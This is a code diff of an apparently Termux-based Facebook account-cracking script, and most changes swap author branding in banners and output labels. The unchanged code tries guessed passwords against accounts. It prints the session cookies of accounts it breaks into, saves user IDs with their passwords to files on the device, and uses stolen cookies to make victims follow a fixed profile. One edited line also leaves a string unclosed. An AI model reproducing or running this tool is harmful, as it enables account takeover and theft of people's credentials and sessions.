@@ -15,7 +15,7 @@ class jalan:
         pass
 
 
-logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mKASHIF\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mARYAN\x1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mARYAN\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO KRS TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'
+logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mBilal\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mBilal\x1b[0;m\x1b[1;32m && \x1b[1;33mBilal\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m BILAL DOGAR\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-Dogar\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mBilal\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mBilal Dogar\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO Bilal TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mBilal\x1b[0;m ======================\n'
 
 def ud():
     os.system('clear')
@@ -55,13 +55,13 @@ def o():
     if opt == '1':
         i()
     if None == '2':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100079215107156')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100079215107156)
         return None
     if None == '3':
         os.system('xdg-open https://youtube.com/channel/UCj1orXtwk7OA-XefD4o8ZcQ')
         return None
     if None == '4':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100079215107156')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100079215107156/')
         return None
     if None == '0':
         os.system('exit')
@@ -114,7 +114,7 @@ def cek_apk(session,coki):
             print('')
  
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=', {
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://free.facebook.com' + str(get), {
@@ -163,27 +163,27 @@ bu = current.month
 ha = current.day
 today = date.today()
 logo =                                          ("""   
-\033[1;32m       888888b.   d8b 888          888 
-\033[1;35m       888  "88b  Y8P 888          888 
-\033[1;35m       888  .88P      888          888 
-\033[1;32m       8888888K.  888 888  8888b.  888 
-\033[1;32m       888  "Y88b 888 888     "88b 888 
-\033[1;35m       888    888 888 888 .d888888 888 
-\033[1;35m       888   d88P 888 888 888  888 888 
-\033[1;32m       8888888P"  888 888 "Y888888 888 
+\033[1;32m       888    d8P  8888888b.   .d8888b.  
+\033[1;35m       888   d8P   888   Y88b d88P  Y88b 
+\033[1;35m       888  d8P    888    888 Y88b.      
+\033[1;32m       888d88K     888   d88P  "Y888b.   
+\033[1;32m       8888888b    8888888P"      "Y88b. 
+\033[1;35m       888  Y88b   888 T88b         "888 
+\033[1;35m       888   Y88b  888  T88b  Y88b  d88P 
+\033[1;32m       888    Y88b 888   T88b  "Y8888P"  
  
 \033[1;37m================= \33[32;45mKASHIF\33[0;m =====================
-\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mBILAL\33[0;m\033[1;32m && \033[1;33mBILAL\33[0;m
-\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m BILAL Dogar
-\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-Bilal
+\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mARYAN\33[0;m\033[1;32m && \033[1;33mKASHIF\33[0;m
+\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m ArYan KhAn
+\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-KRS
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
-\033[1;32m     \033[1;35mTEAM         :  \033[1;35mBilal
+\033[1;32m     \033[1;35mTEAM         :  \033[1;35mKRS
 \033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
-\033[1;37m================= \33[32;45mBilal\33[0;m =====================
+\033[1;37m================= \33[32;45mARYAN\33[0;m =====================
  
-       \33[37;41m\t WELLCOME TO Bilal Dogar TOOL\33[0;m
+       \33[37;41m\t WELLCOME TO KRS TOOL\33[0;m
  
-\033[1;37m================== \33[32;45mBilal\33[0;m ======================\n""")
+\033[1;37m================== \33[32;45mNIDA\33[0;m ======================\n""")
 loop = 0
 oks = []
 cps = []
@@ -333,22 +333,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(Bilal-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(ARYAN-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/Bilal-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/ARYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(Bilal-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/Bilal-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('    \33[1;30m(ARYAN-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/ARYAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r     %s[Bilal] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[ARYAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
